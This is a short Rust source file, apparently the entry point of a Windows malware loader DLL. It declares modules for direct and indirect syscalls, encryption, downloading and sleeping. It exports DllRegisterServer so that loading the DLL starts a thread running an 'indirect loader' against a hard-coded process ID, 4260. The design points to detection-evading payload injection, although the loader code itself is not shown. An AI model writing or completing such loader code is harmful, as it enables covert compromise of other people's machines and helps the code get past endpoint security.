mod direct_syscalls;
mod crypt;
mod download;
mod sleep;
mod utils;
mod indirect_loader;
mod indirect_syscalls;

#[no_mangle]
pub extern "stdcall" fn DllRegisterServer(
    _hwnd: winapi::shared::windef::HWND,
    _hinst: winapi::shared::minwindef::HINSTANCE,
    _lpszCmdLine: winapi::shared::ntdef::LPSTR,
    _nCmdShow: i32,
) -> i32 {
    std::thread::spawn(|| {
        if let Err(e) = crate::indirect_loader::run_indirect_loader(4260) {
            #[cfg(debug_assertions)]
            eprintln!("[!] Loader error: {:?}", e);
        }
    });
     0
}
